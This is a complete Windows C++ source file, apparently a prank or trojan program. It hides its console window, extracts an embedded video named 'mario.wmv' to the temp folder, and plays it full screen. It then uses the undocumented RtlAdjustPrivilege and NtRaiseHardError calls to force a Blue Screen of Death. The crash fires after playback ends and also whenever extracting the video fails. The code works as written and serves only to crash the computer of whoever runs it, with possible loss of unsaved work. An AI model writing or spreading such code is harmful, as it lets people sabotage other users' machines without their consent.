#include <dshow.h>
#include <windows.h>

// externs for BSoD functions
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG privilege, BOOLEAN enable, BOOLEAN client, PBOOLEAN wasEnabled);
extern "C" NTSTATUS NTAPI NtRaiseHardError(NTSTATUS errorStatus, ULONG numberOfParameters, ULONG unicodeStringParameterMask, PULONG_PTR parameters, ULONG validResponseOptions, PULONG response);

// global pointers for DirectShow interfaces
IGraphBuilder* graph = NULL;
IMediaControl* control = NULL;
IMediaEvent* event = NULL;
IVideoWindow* window = NULL;

void TriggerBSOD() {
    // initialize variables
    BOOLEAN previousState;
    ULONG response;

    // adjust privileges and raise BSoD
    RtlAdjustPrivilege(19, TRUE, FALSE, &previousState);
    NtRaiseHardError(0xdeadbeef, 0, 0, NULL, 6, &response);
}

int GetVideoResource(LPWSTR* path) {
    // get video resource handle
    HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(2), RT_RCDATA);

    // get resource data
    DWORD size = SizeofResource(NULL, resource);
    LPVOID data = LockResource(LoadResource(NULL, resource));

    if (data == NULL) {
        return 1; // return if resource data is null
    }

    // create temporary file path
    *path = new WCHAR[MAX_PATH];

    GetTempPathW(MAX_PATH, *path);
    StringCbCatW(*path, MAX_PATH, L"mario.wmv");

    // create temporary file and write resource data to it
    HANDLE file = CreateFileW(*path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD bytesWritten;

    if (file == INVALID_HANDLE_VALUE) {
        return 1; // return if file handle is invalid
    }

    if (!WriteFile(file, data, size, &bytesWritten, NULL) || bytesWritten != size) {
        return 1; // return if file write fails
    }

    // close file handle and free resource
    CloseHandle(file);
    FreeResource(resource);

    // return on success
    return 0;
}

void InitializeDirectShow(LPCWSTR path) {
    // initialize COM library
    CoInitialize(NULL);

    // create DirectShow objects
    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);

    graph->QueryInterface(IID_IMediaControl, (void**)&control);
    graph->QueryInterface(IID_IMediaEvent, (void**)&event);
    graph->QueryInterface(IID_IVideoWindow, (void**)&window);

    // render video file
    graph->RenderFile(path, NULL);

    // set DirectShow to full screen mode
    window->put_FullScreenMode(OATRUE);
}

int main() {
    // initialize variables
    LPWSTR path;
    HRESULT result;
	LONG eventCode;

    // hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // get video resource
    if (GetVideoResource(&path) == 1) {
        TriggerBSOD(); // trigger BSoD on failure
    }

    // initialize DirectShow
    InitializeDirectShow(path);

    // play video
    result = control->Run();

    // wait for video playback to complete
	if (SUCCEEDED(result)) {
		event->WaitForCompletion(INFINITE, &eventCode);
	}

    // trigger BSoD
    TriggerBSOD();

    // return on failure
    return 1;
}